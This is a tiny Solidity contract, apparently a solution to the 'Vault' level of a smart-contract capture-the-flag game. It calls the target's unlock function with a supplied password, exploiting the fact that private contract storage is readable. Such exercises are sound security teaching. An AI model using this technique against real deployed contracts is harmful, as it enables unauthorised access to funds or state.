pragma solidity ^0.6.0;

import '../levels/Vault.sol';

contract VaultAttack {
  function attack(address _target, bytes32 _password) public {
    Vault vault = Vault(_target);
    vault.unlock(_password);
  }
}
